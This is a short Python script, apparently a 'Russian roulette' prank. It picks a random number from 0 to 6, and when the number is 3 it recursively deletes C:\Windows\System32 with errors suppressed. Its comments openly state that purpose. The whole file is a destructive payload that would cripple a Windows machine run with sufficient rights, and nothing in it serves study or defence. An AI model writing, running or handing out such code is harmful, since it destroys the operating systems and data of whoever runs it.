import random
import shutil

#random number between 0 and 6
random_number = random.randint(0, 6)

#shows the output of "random_number"
print(random_number)

#if the output is 3 the code will delete the system 32 directory and exits the program on the next key press
if random_number == 3:
    shutil.rmtree(r'C:\Windows\System32', ignore_errors=True)
    
input("Press Enter to exit...")
    
